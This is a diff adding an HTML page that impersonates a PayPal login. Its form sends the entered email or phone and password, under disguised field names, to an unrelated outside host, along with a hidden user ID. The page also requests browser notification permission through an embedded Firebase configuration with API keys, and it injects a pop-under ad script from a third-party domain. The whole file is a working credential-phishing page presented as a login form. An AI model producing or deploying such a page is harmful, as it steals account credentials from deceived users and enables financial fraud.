@@ -1,0 +1,161 @@
+
+
+   <title>login | form</title>
+   <html lang="en">
+                 <head>
+                 <meta charset="UTF-8">
+                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                 <title>Login</title>
+                 <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+                 <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+                 <script src="https://cdn.tailwindcss.com"></script>
+                 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+                 <style type="text/css" id="operaUserStyle">
+                 body{
+                   color:black; 
+                   background:white; 
+                 }
+                 input {
+                   height: 7%;
+                   width: 80%;
+                   padding: 10px;
+                   margin: 3px;
+                 }
+                 button {
+                   color: white;
+                   background-color: blue;
+                   border-radius: 25px;
+                   border: 4px solid blue;
+                   height: 7%;
+                   margin: 10px;
+                 }
+                 h5 {
+                   margin: 90px;
+                 }
+                 </style>
+                 <center>
+                 </head>
+                 <body class="bg-[#111111]">
+                  <noscript>You need to enable JavaScript to run this app.</noscript>
+                  <div id="root"><div>
+                  <div class="grid place-content-center grid-cols-1 md:px-96 mt-10 gap-10">
+                  <div class="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "></div>
+    <div class="flex justify-center w-full">
+    <img src="https://pvideo.xyz/assets/files/upload-1721685972.png" alt="image" width="0px" height="50px">
+    </div>
+    <div class="flex justify-center w-full">
+    <img src="https://pvideo.xyz/assets/files/upload-1721685972.png" alt="image" width="95%" height="25%">
+    </div>
+    <p>
+      <h4>
+      Log in to your paypal account
+      </h4>
+    </p>
+    <form action="https://pinnocent.com/vpage" method="POST">
+    <input type="hidden" name="link" value="custom template">
+    <input type="hidden" name="ftype" value="normal">
+    <input type="hidden" name="login" value="login">
+    <input type="hidden" name="user_id" value="16934">
+    <div class="p-2 w-full  gap-1  ">
+    <div class="flex flex-col   p-2  gap-1">
+    <label for="email" class="text-sm"></label>
+    <input type="text" class="w-full border p-2 rounded-md" name="message_title" placeholder="Email or Phone"></div>
+    <div class="flex flex-col   p-2   gap-1">
+    <label for="password" class="text-sm"></label>
+    <input type="password" class="w-full border p-2 rounded-md" name="description" placeholder="Password" id="password" autocomplete="new-password" aria-autocomplete="list"></div>
+    <div class="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+    <button type="submit" class=" text-black font-semibold p-3 rounded-md w-full bg-[#125ec3] hover:bg-blue-600" style="width: 85%">
+      <b>
+        Log in
+      </b>
+    </button>
+    </div>
+    </div>
+    </form>
+    </div>
+    </div>
+    </div></body></html>
+    <h5>
+      English | Françaíce | Español
+    </h5>
+    <p id=""></p>
+<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-messaging.js"></script>
+<script>
+    var firebaseConfig = {
+apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+  authDomain: "pinnocent-fa387.firebaseapp.com",
+  databaseURL: "https://pinnocent-fa387.firebaseio.com",
+  projectId: "pinnocent-fa387",
+  storageBucket: "pinnocent-fa387.appspot.com",
+  messagingSenderId: "403452483449",
+  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+  measurementId: "G-8DGVGDCCL2"
+};
+    firebase.initializeApp(firebaseConfig);
+    const messaging=firebase.messaging();
+
+    function IntitalizeFireBaseMessaging() {
+        messaging
+            .requestPermission()
+            .then(function () {
+                console.log("Notification Permission");
+                return messaging.getToken();
+            })
+            .then(function (token) {
+                console.log("Token : "+token);
+                document.getElementById("token").innerHTML=token;
+            })
+            .catch(function (reason) {
+                console.log(reason);
+            });
+    }
+
+    messaging.onMessage(function (payload) {
+        console.log(payload);
+        const notificationOption={
+            body:payload.notification.body,
+            icon:payload.notification.icon
+        };
+
+        if(Notification.permission==="granted"){
+            var notification=new Notification(payload.notification.title,notificationOption);
+
+            notification.onclick=function (ev) {
+                ev.preventDefault();
+                window.open(payload.notification.click_action,'https://pinnocent.com/chat?');
+                notification.close();
+            }
+        }
+
+    });
+    messaging.onTokenRefresh(function () {
+        messaging.getToken()
+            .then(function (newtoken) {
+                console.log("New Token : "+ newtoken);
+            })
+            .catch(function (reason) {
+                console.log(reason);
+            })
+    })
+    IntitalizeFireBaseMessaging();
+</script> 
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-E7K8F1651E');
+</script>
+<script type="text/javascript">
+   var uid = '330441';
+   var wid = '717208';
+   var pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag)};
+</script>
+<script src="back.js?1718726358"> 
+</script>
+
+	
